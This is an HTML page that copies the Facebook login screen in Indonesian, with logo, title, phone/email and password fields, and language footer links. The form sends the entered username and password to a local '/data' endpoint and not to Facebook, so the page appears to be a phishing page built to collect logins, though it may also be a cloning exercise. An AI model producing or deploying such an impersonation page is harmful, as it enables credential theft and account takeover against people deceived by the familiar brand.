<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="style.css" />
    <title>Facebook</title>
  </head>
  <body>
    <main class="main-body">
      <div class="logo">
        <img src="./Facebook-Logo.wine.png" alt="Facebook" />
      </div>
      <div class="form-login">
        <form action="/data" method="post" class="form-login-main">
          <input
            type="text"
            id="user"
            name="user"
            placeholder="Nomor ponsel atau email"
          />
          <input type="password" name="password" placeholder="Kata sandi" />
          <button type="submit">Masuk</button>
          <div class="hyperlinks">
            <a href="">Lupa kata sandi?</a>
          </div>
        </form>
      </div>
    </main>
    <hr class="line-1" />
    <button class="button-new-account">Buat akun baru</button>
    <div class="footer">
      <div class="footer-1">
        <a href="">Bahasa indonesia</a>
        <br />
        <a href="">Basa jawa</a>
        <br />
        <a href="">Portugese (brasil)</a>
      </div>
      <div class="footer-2">
        <a href="">English (UK)</a>
        <br />
        <a href="">Bahasa Melayu</a>
        <br />
        <a href="">Espanol</a>
      </div>
    </div>
    <div class="foot-last">
      <ul>
        <li>Tentang</li>
        <li>Batuan</li>
        <li>Lainya</li>
      </ul>
    </div>
  </body>
</html>
